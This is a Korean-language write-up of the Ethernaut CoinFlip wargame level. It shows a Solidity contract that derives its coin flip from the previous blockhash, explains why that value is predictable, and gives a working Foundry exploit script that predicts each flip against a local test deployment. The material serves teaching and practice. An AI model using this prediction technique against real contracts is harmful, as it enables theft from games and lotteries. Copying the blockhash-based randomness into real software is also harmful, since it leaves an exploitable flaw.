# 지문

이것은 **동전 던지기 게임**으로, 동전 던지기의 결과를 맞춰 **연승 기록을 쌓아야** 합니다.
이 레벨을 완료하려면, **동전 결과를 10번 연속으로 정확히 맞춰야** 합니다.

도움이 될 수 있는 것들:

* 오른쪽 상단 메뉴의 "?" 페이지에서 **"Beyond the console"** 섹션을 참고하세요.


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

# 풀이 
solidity 초창기에는 smart contract상에서 random 값을 구현하지 못했음.
각 node별로 다른 random값이 나오게되면 그건 Network Fork로 이어지기 때문임.
현재는 그를 보완하기 위해서 다양한 방법이 있는데 그것까지 이야기하기엔 설명이 너무 길어지므로 여기선 생략하도록 하겠음.
아무튼 초창기에는 어쩔수없이 `blockhash`나 `block.timestamp`를 이용해서 구현했는데 문제는 그 값을 그 block안에 들어있는 다른 transaction에서 알아낼 수가 있었음 

그것을 이용해서 푸는 문제임 


```solidity
// SPDX-License-Identifier: UNLICENSED
// 실행 10번 반복
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function flip(bool _guess) external returns (bool);
    function consecutiveWins() external view returns (uint256);
}

contract Loader {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    function play(address target) public {
        console.log("current block.number : %d", block.number);
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        ITarget(target).flip(side);
    }
}
contract SolveScript is Script {
    address public target = 0xeC4cFde48EAdca2bC63E94BB437BbeAcE1371bF3;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol:SolveScript --broadcast --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        //Loader loader = new Loader();
        Loader loader = Loader(0x9E7088C23e5C0B2D02cD7886A1BDbC7FE8b71016);
        console.log("loader address : %s", address(loader));
        loader.play(target);
        vm.stopBroadcast();
    }
}
```
